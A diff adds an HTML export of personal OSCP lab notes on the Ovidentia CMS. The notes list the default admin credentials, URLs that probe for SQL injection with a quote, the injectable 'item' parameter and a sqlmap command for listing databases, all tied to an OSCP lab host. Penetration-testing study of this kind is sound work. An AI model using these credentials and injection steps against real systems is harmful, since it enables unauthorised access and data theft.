@@ -1,0 +1,12 @@
+<!doctype html>
+<html>
+<head>
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+  <title>Ovidentia</title>
+  <meta name="generator" content="CherryTree">
+  <link rel="stylesheet" href="res/styles3.css" type="text/css" />
+</head>
+<body>
+<div class='page'><strong><h1># Ovidentia</h1></strong><br /><a href="http://www.ovidentia.org">http://www.ovidentia.org</a><br /><br />&quot;Content Management Collaborative platform&quot;<br />&quot;Ovidentia allows you to easily and easily integrate an Internet publishing environment or a groupware portal (internet, extranet, intranet) for your company, organization, community ...&quot;<br /><br />Despite the description on their website, I still have no idea what Ovidentia actually does...<br /><br /><strong>Examples</strong><br />• OSCP 10.11.1.73 - Gamma<br /><br /><strong><h2>## Default Credentials</h2></strong><br />• <a href="http://www.ovidentia.org/index.php?tg=articles&idx=Print&topics=67&article=428">http://www.ovidentia.org/index.php?tg=articles&amp;idx=Print&amp;topics=67&amp;article=428</a><br />   ◇ <code>admin@admin.bab / 012345678</code><br />   ◇ used in OSCP 10.11.1.73 - Gamma<br /><br /><strong><h2>## SQL Injection</h2></strong><br />• Check for a SQL injection error <br />   ◇ <a href="http://10.11.1.73:8080/PHP/index.php?tg=delegat&idx=mem&id=1%27">http://10.11.1.73:8080/PHP/index.php?tg=delegat&amp;idx=mem&amp;id=1%27</a><br />   ◇ <a href="http://10.11.1.73:8080/PHP/index.php?tg=admoc&idx=octypes&action=delete_type&item=1%27&entitytype=2">http://10.11.1.73:8080/PHP/index.php?tg=admoc&amp;idx=octypes&amp;action=delete_type&amp;item=1%27&amp;entitytype=2</a><br />      ▪ <code>item</code> parameter is injectable<br />      ▪ <code>sqlmap -r admoc.request --dbms=mysql --dbs -p item</code><br />• There&#39;s lots of SQL injection vulns in Ovidentia depending on the verison. <code>searchsploit</code> for them<br /><br /><br /></div>
+</body>
+</html>
